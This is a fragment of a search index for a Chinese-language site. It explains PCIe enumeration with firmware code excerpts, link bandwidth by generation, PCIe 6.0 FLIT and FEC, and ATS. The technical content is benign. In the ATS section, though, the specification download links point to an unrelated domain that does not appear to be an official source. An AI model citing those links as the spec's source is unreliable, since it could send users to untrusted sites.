<p>\u200b\u4ece\u200b\u4ee3\u7801\u200b\u4e2d\u200b\u53bb\u6389\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u70ed\u63d2\u62d4\u200b\u76f8\u5173\u200b\u7684\u200b\u4ee3\u7801\u200b\uff0c\u200b\u7b80\u5355\u200b\u6765\u8bf4\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u601d\u8def\u200b\u5982\u4e0b\u200b\uff1a</p> <ol> <li>\u200b\u679a\u4e3e\u200b\u5f53\u524d\u200b\u8bbe\u5907\u200b\u4e0b\u200b\u7684\u200b Device \u200b\u548c\u200b Function</li> <li>\u200b\u5982\u679c\u200b\u627e\u5230\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u6865\u200b\u8bbe\u5907\u200b\uff0c\u200b\u4e3a\u200b\u5b83\u200b\u5206\u914d\u200b\u4e00\u4e2a\u200b\u65b0\u200b\u7684\u200b Bus Number<ol> <li>\u200b\u8bbe\u7f6e\u200b\u8fd9\u4e2a\u200b\u65b0\u200b\u7684\u200b\u6865\u200b\u8bbe\u5907\u200b\u7684\u200b Primary Bus Number \u200b\u4e3a\u200b Start Bus Number\uff08\u200b\u4e5f\u200b\u5c31\u662f\u200b\u4e0a\u200b\u4e00\u7ea7\u200b\u7684\u200b Secondary Bus Number\uff09\uff0cSecondary Bus \u200b\u662f\u200b\u65b0\u200b\u5206\u914d\u200b\u7684\u200b Bus Number\uff0cSubordinate Bus Number \u200b\u662f\u200b\u6700\u5927\u503c\u200b</li> <li>\u200b\u8fd9\u6837\u200b\u8bbe\u7f6e\u200b\u5b8c\u6210\u200b\u540e\u200b\uff0c\u200b\u76f8\u5f53\u4e8e\u200b\u6240\u6709\u200b\u7684\u200b\u5728\u200b <code>[Secondary Bus Number, Max Bus Number]</code> \u200b\u8303\u56f4\u200b\u4e2d\u200b\u7684\u200b Bus \u200b\u8bf7\u6c42\u200b\u90fd\u200b\u4f1a\u200b\u8def\u7531\u200b\u5230\u200b\u65b0\u200b\u7684\u200b\u6865\u200b\u8bbe\u5907\u200b\u4e0a\u200b</li> <li>\u200b\u9012\u5f52\u200b\u8c03\u7528\u200b PciScanBus\uff0c\u200b\u53c2\u6570\u200b\u662f\u200b\u65b0\u200b\u7684\u200b\u6865\u200b\u8bbe\u5907\u200b\uff0cStart Bus Number \u200b\u4e3a\u200b\u65b0\u200b\u7684\u200b Secondary Bus Number</li> <li>\u200b\u9012\u5f52\u200b\u8c03\u7528\u200b\u8fd4\u56de\u200b\u4ee5\u540e\u200b\uff0c\u200b\u65b0\u200b\u7684\u200b\u6865\u200b\u8bbe\u5907\u200b\u4e0b\u9762\u200b\u6240\u6709\u200b\u7684\u200b\u8bbe\u5907\u200b\u90fd\u200b\u5206\u914d\u200b\u5230\u200b\u4e86\u200b\u81ea\u5df1\u200b\u7684\u200b Bus Number\uff0c\u200b\u8fd9\u65f6\u5019\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u77e5\u9053\u200b\u51c6\u786e\u200b\u7684\u200b Subordinate Bus Number \u200b\u4e86\u200b\uff0c\u200b\u4e0d\u518d\u200b\u662f\u200b\u521a\u624d\u200b\u4e34\u65f6\u200b\u8bbe\u7f6e\u200b\u7684\u200b Max Bus Number\uff0c\u200b\u56e0\u6b64\u200b\u8fd9\u65f6\u5019\u200b\u518d\u200b\u628a\u200b\u51c6\u786e\u200b\u7684\u200b Subordinate Bus Number \u200b\u5199\u5165\u200b\u6865\u200b\u8bbe\u5907\u200b\u7684\u200b Subordinate Bus Number \u200b\u4e2d\u200b</li> </ol> </li> <li>\u200b\u679a\u4e3e\u200b\u5b8c\u200b\u6240\u6709\u200b\u8bbe\u5907\u200b\u4ee5\u540e\u200b\uff0c\u200b\u8fd4\u56de\u200b\u76ee\u524d\u200b\u9012\u5f52\u200b\u5206\u914d\u200b\u5f97\u5230\u200b\u7684\u200b\u6700\u5927\u200b\u7684\u200b Bus Number</li> </ol> <p>\u200b\u8fd9\u6837\u200b\u6574\u7406\u51fa\u6765\u200b\u4e00\u770b\u200b\uff0c\u200b\u5176\u5b9e\u200b\u5f88\u200b\u6e05\u695a\u200b\uff0c\u200b\u8fd9\u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b DFS \u200b\u7b97\u6cd5\u200b\uff0c\u200b\u5728\u200b\u641c\u7d22\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u4fdd\u8bc1\u200b\u5f53\u524d\u200b\u7684\u200b\u7ed3\u70b9\u200b\u53ef\u200b\u8fbe\u200b\uff0c\u200b\u4fdd\u8bc1\u200b\u4ece\u200b Root Bridge \u200b\u5230\u200b\u5f53\u524d\u200b\u7684\u200b\u7ed3\u70b9\u200b\u8def\u5f84\u200b\u4e0a\u200b\u7684\u200b Bus Number \u200b\u8303\u56f4\u200b\u90fd\u200b\u662f\u200b <code>[Secondary Bus Number, Max Bus Number]</code>\uff1b\u200b\u5f53\u200b\u7ed3\u70b9\u200b\u641c\u7d22\u200b\u5b8c\u200b\u4ee5\u540e\u200b\uff0c\u200b\u518d\u200b\u56de\u6eaf\u200b\uff0c\u200b\u56de\u6eaf\u200b\u7684\u200b\u65f6\u5019\u200b\u5c31\u200b\u77e5\u9053\u200b\u4e86\u200b\u5b9e\u9645\u200b\u5206\u914d\u200b\u5230\u200b\u591a\u200b\u5927\u200b\u7684\u200b Bus Number\uff0c\u200b\u8fd9\u65f6\u5019\u200b\u518d\u200b\u586b\u56de\u200b Subordinate Bus Number\uff0c\u200b\u6700\u540e\u200b\u4fdd\u8bc1\u200b\u8fd9\u4e2a\u200b\u6811\u4e0a\u200b\u6bcf\u200b\u4e00\u5c42\u200b\u7684\u200b <code>[Secondary Bus Number, Subordinate Bus Number]</code> \u200b\u533a\u95f4\u200b\u4e0d\u200b\u91cd\u5408\u200b\uff0c\u200b\u4e14\u200b\u6bcf\u4e2a\u200b\u5b50\u200b\u7ed3\u70b9\u200b\u7684\u200b\u533a\u95f4\u200b\u90fd\u200b\u5305\u542b\u200b\u4e8e\u7236\u200b\u7ed3\u70b9\u200b\u7684\u200b\u533a\u95f4\u200b\u3002</p> <p>\u200b\u6700\u540e\u200b\u7684\u200b\u7ed3\u679c\u200b\uff0c\u200b\u7c7b\u4f3c\u200b MindShare \u200b\u4e66\u4e2d\u200b\u7684\u200b\u8fd9\u4e2a\u200b\u56fe\u200b\uff1a</p> <p> </p> PCIe \u200b\u679a\u4e3e\u200b\u7ed3\u679c\u200b\uff08\u200b\u56fe\u6e90\u200b MineShare PCIe 3.0 \u200b\u4e66\u200b\uff09 <p>\u200b\u4e3a\u4e86\u200b\u652f\u6301\u200b PCIe \u200b\u70ed\u63d2\u62d4\u200b\uff0c\u200b\u6216\u8005\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u52a8\u6001\u200b\u4ea7\u751f\u200b\u65b0\u200b\u8bbe\u5907\u200b\u7684\u200b SR-IOV\uff0c\u200b\u4ee3\u7801\u200b\u4e2d\u200b\u505a\u200b\u4e86\u200b\u76f8\u5e94\u200b\u7684\u200b\u9884\u7559\u200b\uff1a</p> <pre><code>if (FeaturePcdGet(PcdPciBusHotplugDeviceSupport)) {\n  //\n  // If Hot Plug is supported,\n  // Get the bridge information\n  //\n  BusPadding = FALSE;\n  if (gPciHotPlugInit != NULL) {\n    if (IsPciHotPlugBus(PciDevice)) {\n      //\n      // If it is initialized, get the padded bus range\n      //\n      Status = gPciHotPlugInit-&gt;GetResourcePadding(\n          gPciHotPlugInit, PciDevice-&gt;DevicePath, PciAddress, &amp;State,\n          (VOID **)&amp;Descriptors, &amp;Attributes);\n\n      if (EFI_ERROR(Status)) {\n        return Status;\n      }\n\n      BusRange = 0;\n      NextDescriptors = Descriptors;\n      Status = PciGetBusRange(&amp;NextDescriptors, NULL, NULL, &amp;BusRange);\n\n      FreePool(Descriptors);\n\n      if (!EFI_ERROR(Status)) {\n        BusPadding = TRUE;\n      } else if (Status != EFI_NOT_FOUND) {\n        //\n        // EFI_NOT_FOUND is not a real error. It indicates no bus number padding\n        // requested.\n        //\n        return Status;\n      }\n    }\n  }\n}\n\nif (FeaturePcdGet(PcdPciBusHotplugDeviceSupport) &amp;&amp; BusPadding) {\n  //\n  // Ensure the device is enabled and initialized\n  //\n  if ((Attributes == EfiPaddingPciRootBridge) &amp;&amp;\n      ((State &amp; EFI_HPC_STATE_ENABLED) != 0) &amp;&amp;\n      ((State &amp; EFI_HPC_STATE_INITIALIZED) != 0)) {\n    *PaddedBusRange = (UINT8)((UINT8)(BusRange) + *PaddedBusRange);\n  } else {\n    //\n    // Reserve the larger one between the actual occupied bus number and padded\n    // bus number\n    //\n    Status = PciAllocateBusNumber(PciDevice, SecondBus, (UINT8)(BusRange),\n                                  &amp;PaddedSubBus);\n    if (EFI_ERROR(Status)) {\n      return Status;\n    }\n\n    *SubBusNumber = MAX(PaddedSubBus, *SubBusNumber);\n  }\n}\n</code></pre> <p>SR-IOV:</p> <pre><code>//\n// It is device. Check PCI IOV for Bus reservation\n// Go through each function, just reserve the MAX ReservedBusNum for one device\n//\nif (PcdGetBool(PcdSrIovSupport) &amp;&amp; (PciDevice-&gt;SrIovCapabilityOffset != 0)) {\n  if (TempReservedBusNum &lt; PciDevice-&gt;ReservedBusNum) {\n    Status = PciAllocateBusNumber(\n        PciDevice, *SubBusNumber,\n        (UINT8)(PciDevice-&gt;ReservedBusNum - TempReservedBusNum), SubBusNumber);\n    if (EFI_ERROR(Status)) {\n      return Status;\n    }\n\n    TempReservedBusNum = PciDevice-&gt;ReservedBusNum;\n\n    if (Func == 0) {\n      DEBUG((DEBUG_INFO, \"PCI-IOV ScanBus - SubBusNumber - 0x%x\\n\",\n             *SubBusNumber));\n    } else {\n      DEBUG((DEBUG_INFO, \"PCI-IOV ScanBus - SubBusNumber - 0x%x (Update)\\n\",\n             *SubBusNumber));\n    }\n  }\n}\n</code></pre> <p>\u200b\u5206\u914d\u200b\u597d\u200b Bus \u200b\u4ee5\u540e\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5bf9\u200b\u6240\u6709\u200b\u8bbe\u5907\u200b\u8fdb\u884c\u200b Configuration Request \u200b\u4e86\u200b\uff0c\u200b\u540e\u7eed\u200b\u7684\u200b Memory \u200b\u548c\u200b IO \u200b\u5730\u5740\u200b\u7684\u200b\u5206\u914d\u200b\u548c\u200b\u8def\u7531\u200b\uff0c\u200b\u4e5f\u200b\u662f\u200b\u7c7b\u4f3c\u200b\u5730\u200b\u9012\u5f52\u200b\u5730\u200b\u8fdb\u884c\u200b\u5206\u914d\u200b\uff0c\u200b\u7136\u540e\u200b\u56de\u6eaf\u200b\u7684\u200b\u65f6\u5019\u200b\u5408\u5e76\u200b\u5730\u5740\u200b\u533a\u95f4\u200b\u5373\u53ef\u200b\u3002</p>"},{"location":"hardware/pcie.html#_5","title":"\u7269\u7406\u5c42","text":"<p>\u200b\u7269\u7406\u5c42\u200b\u7f16\u7801\u200b\u4e0a\u200b\uff0cPCIe 1.0 \u200b\u548c\u200b 2.0 \u200b\u91c7\u7528\u200b\u7684\u200b\u662f\u200b NRZ 8b/10b\uff0cPCIe 3.0 \u200b\u5230\u200b 5.0 \u200b\u7528\u200b\u7684\u200b\u662f\u200b NRZ 128b/130b\uff0c\u200b\u6700\u65b0\u200b\u7684\u200b PCIe 6.0 \u200b\u548c\u200b 7.0 \u200b\u5219\u200b\u6362\u6210\u200b\u4e86\u200b PAM4 FLIT\u3002\u200b\u53ef\u4ee5\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u6bcf\u200b\u4e00\u4ee3\u200b x16 Lane \u200b\u60c5\u51b5\u200b\u4e0b\u200b\u7684\u200b\u6700\u5927\u200b\u6570\u636e\u200b\u5e26\u5bbd\u200b\uff1a</p> <ul> <li>PCIe 1.0: <code>2.5 * 8 / 10 * 16 = 32 Gb/s</code></li> <li>PCIe 2.0: <code>5.0 * 8 / 10 * 16 = 64 Gb/s</code></li> <li>PCIe 3.0: <code>8.0 * 128 / 130 * 16 = 126 Gb/s</code></li> <li>PCIe 4.0: <code>16.0 * 128 / 130 * 16 = 252 Gb/s</code></li> <li>PCIe 5.0: <code>32.0 * 128 / 130 * 16 = 504 Gb/s</code></li> <li>PCIe 6.0: <code>64.0 * 16 = 1024 Gb/s</code>\uff0c\u200b\u5982\u679c\u200b\u8003\u8651\u200b FLIT \u200b\u5f15\u5165\u200b\u7684\u200b\u5f00\u9500\u200b\uff0c\u200b\u5219\u200b\u662f\u200b <code>64.0 * 242 / 256 * 16 = 968 Gb/s</code></li> <li>PCIe 7.0: <code>128.0 * 16 = 2048 Gb/s</code>\uff0c\u200b\u5982\u679c\u200b\u8003\u8651\u200b FLIT \u200b\u5f15\u5165\u200b\u7684\u200b\u5f00\u9500\u200b\uff0c\u200b\u5219\u200b\u662f\u200b <code>128.0 * 242 / 256 * 16 = 1936 Gb/s</code></li> </ul>"},{"location":"hardware/pcie.html#pcie-60","title":"PCIe 6.0","text":"<p>PCIe 6.0 \u200b\u5f15\u5165\u200b\u4e86\u200b PAM4 \u200b\u6765\u200b\u66ff\u4ee3\u200b\u539f\u6765\u200b\u7684\u200b NRZ\uff0c\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u6ce2\u7279\u7387\u200b\u4e0d\u53d8\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u901f\u5ea6\u200b\u7ffb\u500d\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4e0d\u518d\u200b\u4f7f\u7528\u200b 128b/130b\uff0c\u200b\u4e3a\u4e86\u200b\u89e3\u51b3\u200b PAM4 \u200b\u5e26\u6765\u200b\u7684\u200b\u66f4\u200b\u9ad8\u200b\u7684\u200b\u9519\u8bef\u7387\u200b\uff0c\u200b\u5f15\u5165\u200b\u4e86\u200b FEC\uff0cCRC \u200b\u8fd8\u6709\u200b\u683c\u96f7\u200b\u7801\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4e3a\u4e86\u200b FEC \u200b\u5f15\u5165\u200b\u4e86\u200b FLIT\u3002</p> <p>\u200b\u7f51\u4e0a\u200b\u53ef\u4ee5\u200b\u641c\u200b\u5230\u200b\u5173\u4e8e\u200b PCIe \u200b\u7684\u200b PPT\uff1aPCIe\u00ae 6.0 Specification: The Interconnect for I/O Needs of the Future \u200b\u548c\u200b PCIE\u00ae 6.0 SPECIFICATION: A HIGH-PERFORMANCE I/O INTERCONNECT FOR ADVANCED NETWORKING APPLICATIONS\uff0c\u200b\u4ee5\u53ca\u200b\u5173\u4e8e\u200b FLIT \u200b\u7684\u200b\u535a\u5ba2\u200b\uff1aThe PCIe\u00ae 6.0 Specification Webinar Q&amp;A: A Deeper Dive into FLIT Mode, PAM4, and Forward Error Correction (FEC)\uff0c\u200b\u5173\u4e8e\u200b FEC \u200b\u548c\u200b CRC \u200b\u7684\u200b\u535a\u5ba2\u200b\uff1aPCIe 6.0 Verification of FEC and CRC</p> <p>\u200b\u603b\u7ed3\u200b FLIT (Flow Control Unit) \u200b\u7684\u200b\u8981\u70b9\u200b\uff1a</p> <ol> <li>\u200b\u6bcf\u4e2a\u200b FLIT \u200b\u56fa\u5b9a\u200b\u957f\u5ea6\u200b 256 \u200b\u5b57\u8282\u200b\uff0c\u200b\u5176\u4e2d\u200b 236 \u200b\u5b57\u8282\u200b\u4f20\u8f93\u200b TLP\uff0c6 \u200b\u5b57\u8282\u200b\u4f20\u8f93\u200b DLLP\uff0c8 \u200b\u5b57\u8282\u200b\u4f20\u8f93\u200b CRC\uff0c6 \u200b\u5b57\u8282\u200b\u4f20\u8f93\u200b FEC\u3002\u200b\u56fa\u5b9a\u200b\u957f\u5ea6\u200b\u7684\u200b\u662f\u200b\u4e3a\u4e86\u200b\u4f7f\u7528\u200b FEC\uff08<code>FLIT mode is adopted for the PCIe 6.0 architecture because error correction needs to operate on fixed sized packets.</code>\uff09\u3002</li> <li>\u200b\u63a5\u53d7\u65b9\u200b\u63a5\u53d7\u200b\u5230\u200b FLIT \u200b\u540e\u200b\uff0c\u200b\u4f1a\u200b\u5c1d\u8bd5\u200b\u8fdb\u884c\u200b FEC \u200b\u89e3\u7801\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5c1d\u8bd5\u200b\u4fee\u590d\u200b\u9519\u8bef\u200b\uff0c\u200b\u518d\u200b\u8fdb\u884c\u200b CRC \u200b\u6821\u9a8c\u200b\u3002\u200b\u5982\u679c\u200b\u4e2d\u9014\u200b\u51fa\u73b0\u200b\u4e86\u200b\u9519\u8bef\u200b\uff0c\u200b\u5219\u200b\u4f1a\u200b\u53d1\u9001\u200b\u4e00\u4e2a\u200b NAK \u200b\u7ed9\u200b\u53d1\u9001\u200b\u65b9\u200b\uff08<code>After a FLIT is received, the receiving device performs the FEC decode, which corrects any correctable error within each FEC group. After the decode, the CRC check is performed. If the CRC check fails, the receiving device can indicate that the FLIT has not been successfully received by sending a NAK (no acknowledgment) back to the transmitting device.</code>\uff09\u3002\u200b\u53d1\u9001\u200b\u65b9\u4f1a\u200b\u91cd\u65b0\u200b\u53d1\u9001\u200b FLIT\uff08<code>The NAK causes a replay, resulting in the FLIT being replayed and delivered without any errors.</code>\uff09\u3002</li> <li>\u200b\u4e00\u4e2a\u200b TLP \u200b\u53ef\u80fd\u200b\u8de8\u8d8a\u200b\u591a\u4e2a\u200b FLIT\uff0c\u200b\u4e00\u4e2a\u200b FLIT \u200b\u53ef\u80fd\u200b\u5305\u62ec\u200b\u591a\u4e2a\u200b TLP\uff0c\u200b\u6839\u636e\u200b TLP \u200b\u5927\u5c0f\u200b\u800c\u5b9a\u200b\u3002TLP \u200b\u4e0d\u200b\u9700\u8981\u200b\u5bf9\u9f50\u200b\u5230\u200b FLIT \u200b\u7684\u200b\u5f00\u5934\u200b\u6216\u8005\u200b\u7ed3\u5c3e\u200b\uff08<code>One TLP can span over multiple FLITs and one FLIT can have multiple TLPs, depending on the size of the TLP. The 236 Bytes in each FLIT of 256 Bytes can be used to transfer a partial TLP, as well as one or more TLPs.</code>\uff09\u3002</li> </ol> <p>\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\uff0cFLIT \u200b\u7684\u200b CRC \u200b\u7528\u200b\u4e86\u200b 8 \u200b\u4e2a\u200b\u5b57\u8282\u200b\uff0c\u200b\u4e0d\u518d\u200b\u9700\u8981\u200b\u539f\u6765\u200b TLP \u200b\u548c\u200b DLLP \u200b\u4e2d\u200b\u7684\u200b ECRC \u200b\u548c\u200b LCRC\u3002\u200b\u5728\u200b\u4e4b\u524d\u200b\u7684\u200b PCIe \u200b\u7248\u672c\u200b\uff0cTLP \u200b\u7684\u200b\u53ef\u9009\u200b Digest \u200b\u662f\u200b 4 \u200b\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b ECRC\uff0cTLP+DLLP \u200b\u7684\u200b LCRC \u200b\u662f\u200b 4 \u200b\u5b57\u8282\u200b\u3002\u200b\u5177\u4f53\u200b\u91c7\u7528\u200b\u591a\u5c11\u200b\u5b57\u8282\u200b\u7684\u200b CRC\uff0c\u200b\u548c\u200b\u76ee\u6807\u200b\u7684\u200b\u9519\u8bef\u7387\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u4f20\u8f93\u200b\u7684\u200b\u5b57\u8282\u6570\u200b\u76f8\u5173\u200b\u3002</p> <p>\u200b\u5177\u4f53\u200b\u5730\u200b\uff0cFLIT \u200b\u7684\u200b 6 \u200b\u5b57\u8282\u200b FEC \u200b\u5206\u4e3a\u200b\u4e09\u7ec4\u200b\uff0c\u200b\u6bcf\u7ec4\u200b 2 \u200b\u5b57\u8282\u200b\uff0c\u200b\u5206\u522b\u200b\u4fdd\u62a4\u200b\u4e09\u5206\u4e4b\u4e00\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u5e76\u4e14\u200b\u662f\u200b\u4ea4\u9519\u200b\u7684\u200b\uff08\u200b\u89c1\u200b\u4e0b\u56fe\u200b\u7684\u200b\u4e09\u79cd\u200b\u989c\u8272\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u989c\u8272\u200b\u5bf9\u5e94\u200b\u4e00\u7ec4\u200b FEC\uff09\uff0c\u200b\u6bcf\u200b\u4e00\u7ec4\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u7ea0\u6b63\u200b\u4e00\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u9519\u8bef\u200b\uff08\u200b\u6839\u636e\u200b\u68c0\u9519\u200b\u7ea0\u9519\u7801\u200b\u7406\u8bba\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u7ea0\u6b63\u200b\u4e00\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u9519\u8bef\u200b\uff0c\u200b\u6bcf\u7ec4\u200b\u9700\u8981\u200b\u989d\u5916\u200b 2 \u200b\u5b57\u8282\u200b\u7684\u200b ECC\uff09\u3002\u200b\u8fd9\u4e2a\u200b\u53eb\u505a\u200b 3-way interleaved ECC\u3002\u200b\u8fd9\u6837\u200b\u505a\u200b\u7684\u200b\u597d\u5904\u200b\u662f\u200b\uff0c\u200b\u5982\u679c\u200b\u67d0\u4e2a\u200b lane \u200b\u4e0a\u200b\u51fa\u73b0\u200b\u8fde\u7eed\u200b 16 \u200b\u4f4d\u200b\u7684\u200b\u9519\u8bef\u200b\uff08\u200b\u4f8b\u5982\u200b Lane 0 \u200b\u7684\u200b\u5b57\u8282\u200b 0\u300116 \u200b\u548c\u200b 32 \u200b\u51fa\u9519\u200b\uff09\uff0c\u200b\u90a3\u4e48\u200b\u5b83\u200b\u9519\u8bef\u200b\u7684\u200b\u8303\u56f4\u200b\u5728\u200b\u6bcf\u7ec4\u200b\u91cc\u200b\u6700\u200b\u591a\u200b\u5f71\u54cd\u200b\u4e00\u4e2a\u200b\u5b57\u8282\u200b\uff08\u200b\u84dd\u8272\u200b\u7ec4\u200b\u5f71\u54cd\u200b 0\uff0c\u200b\u9ec4\u8272\u200b\u7ec4\u200b\u5f71\u54cd\u200b 16\uff0c\u200b\u7eff\u8272\u200b\u7ec4\u200b\u5f71\u54cd\u200b 32\uff09\uff0c\u200b\u800c\u200b\u8fd9\u200b\u4e09\u7ec4\u200b\u5206\u522b\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u7ea0\u6b63\u200b\u4e00\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u9519\u8bef\u200b\uff0c\u200b\u8fd9\u6837\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u6b63\u786e\u200b\u5730\u200b\u7ea0\u6b63\u9519\u8bef\u200b\uff08<code>The FEC is a 3-way interleaved ECC, with each ECC code capable of correcting a single Byte error. The interleaving is done so that a burst error of up to 16 bits in any Lane does not impact more than a Byte in each interleaved ECC code word.</code>\uff09\u3002\u200b\u56fe\u793a\u200b\u89c1\u200b\u4e0b\u200b\uff1a</p> <p> </p> PCIe FLIT 3-Way Interleave ECC \u200b\u56fe\u793a\u200b\uff08\u200b\u56fe\u6e90\u200b PCIe 6.0 Verification of FEC and CRC\uff09 <p>\u200b\u4e3a\u4ec0\u4e48\u200b\u662f\u200b 3 \u200b\u8fd9\u4e2a\u200b\u5947\u6570\u200b\u5462\u200b\uff1f\u200b\u56e0\u4e3a\u200b Lane \u200b\u7684\u200b\u4e2a\u6570\u200b\u662f\u200b 2 \u200b\u7684\u200b\u5e42\u6b21\u200b\uff0c\u200b\u5982\u679c\u200b\u7528\u200b 3 \u200b\u7ec4\u200b\u7684\u8bdd\u200b\uff0c\u200b\u6b63\u597d\u200b\u6bcf\u4e2a\u200b Lane \u200b\u4e0a\u200b\u8fde\u7eed\u200b\u7684\u200b\u5b57\u8282\u200b\u5bf9\u5e94\u200b\u5230\u200b\u4e0d\u540c\u200b\u7684\u200b ECC \u200b\u5206\u7ec4\u200b\u3002\u200b\u518d\u5f80\u200b\u4e0a\u200b\uff0c5 \u200b\u7ec4\u200b ECC \u200b\u4e5f\u200b\u662f\u200b\u53ef\u4ee5\u200b\u7684\u200b\u3002</p>"},{"location":"hardware/pcie.html#pcie-70","title":"PCIe 7.0","text":"<p>PCIe 7.0 \u200b\u5c1a\u672a\u200b\u6b63\u5f0f\u200b\u53d1\u5e03\u200b\uff0c\u200b\u76f8\u5173\u200b\u7684\u200b\u65b0\u95fb\u200b\u5982\u4e0b\u200b\uff1a</p> <ul> <li>PCIe 7.0 Specification, Version 0.9: Final Draft Now Available for Member Review</li> </ul>"},{"location":"hardware/pcie.html#ats","title":"ATS","text":"<p>ATS\uff08Address Translation Service\uff09\u200b\u662f\u200b\u5728\u200b PCIe \u200b\u4e0a\u200b\u7ed9\u200b\u5916\u8bbe\u200b\u63d0\u4f9b\u200b\u67e5\u8be2\u200b\u9875\u8868\u200b\u7684\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u4ece\u800c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u865a\u62df\u5730\u5740\u200b\u3002\u200b\u6807\u51c6\u200b\u53ef\u4ee5\u200b\u5728\u200b https://composter.com.ua/documents/ats_r1.1_26Jan09.pdf \u200b\u5904\u200b\u4e0b\u8f7d\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u5173\u4e8e\u200b ATS \u200b\u7684\u200b PPT\uff1ahttps://composter.com.ua/documents/Address_Translation_Services.pdf\u3002</p> <p>\u200b\u5b83\u200b\u7684\u200b\u6574\u4f53\u200b\u5de5\u4f5c\u200b\u65b9\u5f0f\u200b\u5982\u56fe\u200b\uff1a</p> <p> </p> PCIe ATS \u200b\u5de5\u4f5c\u200b\u65b9\u5f0f\u200b\uff08\u200b\u56fe\u6e90\u200b PCIe ATS \u200b\u6807\u51c6\u200b\uff09 <p>\u200b\u5c31\u662f\u200b\u5728\u200b Root Complex \u200b\u548c\u200b Memory \u200b\u4e4b\u95f4\u200b\u8bbe\u7f6e\u200b\u4e00\u4e2a\u200b Translation Agent\uff0c\u200b\u8d1f\u8d23\u200b\u67e5\u8868\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b Page Table Walker\u3002\u200b\u5b83\u4f1a\u200b\u63a5\u6536\u200b\u6765\u81ea\u200b PCIe \u200b\u8bbe\u5907\u200b\u7684\u200b\u5730\u5740\u200b\u7ffb\u8bd1\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u7136\u540e\u200b\u5b83\u200b\u83b7\u53d6\u200b\u5230\u200b\u9875\u8868\u200b\u5730\u5740\u200b\u540e\u200b\uff0c\u200b\u6839\u636e\u200b\u865a\u62df\u5730\u5740\u200b\u53bb\u67e5\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u9875\u8868\u200b\u3002TLB\uff08\u200b\u5728\u200b\u6807\u51c6\u200b\u4e2d\u200b\u53eb\u505a\u200b Address Translation Cache\uff0cATC\uff09\u200b\u662f\u200b\u5b9e\u73b0\u200b\u5728\u200b PCIe \u200b\u8bbe\u5907\u200b\u4fa7\u200b\u7684\u200b\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u7edf\u4e00\u200b\u7684\u200b TLB\uff0c\u200b\u4e5f\u200b\u4e0d\u662f\u200b CPU \u200b\u6838\u5fc3\u200b\u7684\u200b TLB\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u652f\u6301\u200b ATS\uff0c\u200b\u9700\u8981\u200b\u652f\u6301\u200b\u5982\u4e0b\u200b\u7684\u200b\u64cd\u4f5c\u200b\uff1a</p> <ol> <li>PCIe Device \u200b\u5411\u200b Translation Agent \u200b\u53d1\u9001\u200b Translation Request\uff1bTranslation Agent \u200b\u5411\u200b PCIe Device \u200b\u56de\u590d\u200b Translation Completion\uff1b</li> <li>\u200b\u5f53\u200b\u9875\u8868\u200b\u51fa\u73b0\u200b\u53d8\u5316\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u901a\u77e5\u200b PCIe \u200b\u8bbe\u5907\u200b\u7aef\u7684\u200b TLB\uff0c\u200b\u56e0\u6b64\u200b\u9700\u8981\u200b\u5411\u200b PCIe \u200b\u8bbe\u5907\u200b\u53d1\u9001\u200b Invalidate Request Message\uff1bPCIe \u200b\u8bbe\u5907\u200b\u5b8c\u6210\u200b TLB \u200b\u5237\u65b0\u200b\u540e\u200b\uff0c\u200b\u56de\u590d\u200b\u4e00\u4e2a\u200b Invalidate Complete Message\u3002</li> </ol> <p>ATS \u200b\u6807\u51c6\u200b\u8fd8\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u53ef\u200b\u9009\u200b\u529f\u80fd\u200b\uff0c\u200b\u5c31\u662f\u200b Page Request Interface\uff08PRI\uff09\uff0c\u200b\u5176\u5b9e\u200b\u5c31\u662f\u200b\u7f3a\u9875\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u8bbe\u5907\u200b\u53ef\u4ee5\u200b\u53bb\u200b\u53d1\u9001\u200b Page Request\uff0c\u200b\u8981\u6c42\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u53bb\u200b\u5206\u914d\u200b\u4e00\u4e2a\u200b\u7269\u7406\u200b\u9875\u200b\u3002\u200b\u8fd9\u200b\u5c31\u200b\u50cf\u200b\u7528\u6237\u7a0b\u5e8f\u200b\u91cc\u200b mmap 